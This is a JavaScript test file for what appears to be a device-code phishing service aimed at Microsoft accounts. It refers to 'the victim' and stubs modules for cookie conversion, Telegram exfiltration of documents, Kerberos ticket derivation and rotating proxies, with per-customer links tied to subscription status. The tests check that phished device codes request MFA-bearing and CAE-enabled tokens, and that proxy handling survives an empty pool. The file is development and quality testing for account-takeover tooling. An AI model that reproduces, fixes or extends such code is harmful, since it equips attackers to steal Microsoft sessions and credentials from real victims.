require('./test-env');
/**
 * Verify startDeviceFlow() now sends the ngcmfa/cae claims (the reason the
 * victim was never prompted for MFA), and that a null proxy no longer crashes
 * microsoftclient.
 */
const path = require('path');
const ROOT = require('path').resolve(__dirname, '..', '..');

function stub(rel, exports) {
  const p = require.resolve(path.join(ROOT, rel));
  require.cache[p] = { id: p, filename: p, loaded: true, exports };
  return p;
}

const calls = [];
let deviceCodeResponse = null;

stub('backend/database/connection', {
  query: async (sql) => {
    if (/FROM users/i.test(sql)) return [[{ id: 2, subscription_status: 'active' }], []];
    if (/FROM links/i.test(sql)) return [[{ id: 76, user_id: 2, status: 'active' }], []];
    return [[], []];
  },
  getConnection: async () => ({ query: async () => [[], []], release: () => {} }),
  pool: { query: async () => [[], []] },
});

stub('backend/services/microsoftclient', {
  post: async (url, body, opts) => {
    calls.push({ url, body, opts });
    if (/devicecode/i.test(url)) {
      // First (proxied) attempt fails so the direct fallback runs, mirroring prod.
      if (!opts.noProxy) throw new Error('read ECONNRESET');
      return { status: 200, data: deviceCodeResponse, headers: {} };
    }
    return { status: 200, data: {}, headers: {} };
  },
  get: async () => ({ status: 200, data: {} }),
  release: async () => {},
  buildProxyConfig: () => ({}),
  proxyUrlFor: () => '',
  parseSetCookieCookies: () => ({}),
  DEFAULT_TIMEOUT: 30000,
});

stub('backend/services/notification', { sendTelegramDocument: async () => {} });
stub('backend/services/cookieconverter', { processCookieConversion: async () => null });
stub('backend/services/kerberos', { deriveTGTForToken: async () => ({ success: false }), parsePrtClaims: () => null });

const jwt = require(path.join(ROOT, 'node_modules/jsonwebtoken'));
const config = require(path.join(ROOT, 'backend/config/env'));
const deviceproxy = require(path.join(ROOT, 'backend/services/deviceproxy.js'));

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra ? '  -> ' + extra : '')); }
}

(async () => {
  deviceCodeResponse = {
    device_code: 'DC', user_code: 'A6NGD6DQY',
    verification_uri: 'https://login.microsoft.com/device',
    expires_in: 900, interval: 5, message: 'M',
  };
  const token = jwt.sign({ user_id: 2, link_id: 76 }, config.JWT_SECRET, { expiresIn: '1h' });

  console.log('\n[startDeviceFlow] device-code claims');
  const result = await deviceproxy.startDeviceFlow('cookie', token, 'https://example.test', { ip: '1.2.3.4', userAgent: 'UA' });
  check('startDeviceFlow returned a user_code', result.user_code === 'A6NGD6DQY', JSON.stringify(result));

  const dcCalls = calls.filter(c => /devicecode/i.test(c.url));
  check('devicecode endpoint was called', dcCalls.length > 0, 'calls=' + dcCalls.length);
  const body = dcCalls[dcCalls.length - 1].body;
  const claimsRaw = body.get ? body.get('claims') : null;
  check('claims parameter present on the ISSUED device code', !!claimsRaw,
    'body keys=' + (body.forEach ? Array.from(body.keys()).join(',') : String(body)));
  if (claimsRaw) {
    const parsed = JSON.parse(claimsRaw);
    check('amr=ngcmfa forces MFA',
      JSON.stringify(parsed.access_token && parsed.access_token.amr) === '{"values":["ngcmfa"]}',
      JSON.stringify(parsed));
    check('xms_cc=cp1 enables CAE',
      JSON.stringify(parsed.access_token && parsed.access_token.xms_cc) === '{"values":["cp1"]}',
      JSON.stringify(parsed));
  }

  console.log('\n[microsoftclient] null-proxy guard (behavioral)');
  // claimProxy() returns null when the pool is empty. The request must still
  // complete instead of throwing "Cannot read properties of null (reading 'id')".
  const msPath = require.resolve(path.join(ROOT, 'backend/services/microsoftclient.js'));
  delete require.cache[msPath];
  const pmPath = require.resolve(path.join(ROOT, 'backend/services/proxymanager.js'));
  require.cache[pmPath] = {
    id: pmPath, filename: pmPath, loaded: true,
    exports: {
      claimProxy: async () => null,
      releaseProxy: async () => { throw new Error('releaseProxy must not be called with a null proxy id'); },
      getAxiosProxyConfig: () => null,
    },
  };
  const axiosPath = require.resolve(path.join(ROOT, 'node_modules/axios'));
  require.cache[axiosPath] = {
    id: axiosPath, filename: axiosPath, loaded: true,
    exports: { post: async () => ({ status: 200, data: { ok: true }, headers: {} }) },
  };
  const ms2 = require(path.join(ROOT, 'backend/services/microsoftclient.js'));
  let msErr = '';
  let msResp = null;
  try {
    msResp = await ms2.post('https://example.test/token', 'a=1', { headers: {} });
  } catch (e) { msErr = e.message; }
  check('no crash when claimProxy() returns null', msErr === '', msErr);
  check('response still returned', msResp && msResp.status === 200);

  console.log('\n==== ' + pass + ' passed, ' + fail + ' failed ====');
  process.exit(fail === 0 ? 0 : 1);
})().catch(e => { console.error('TEST CRASH:', e); process.exit(2); });
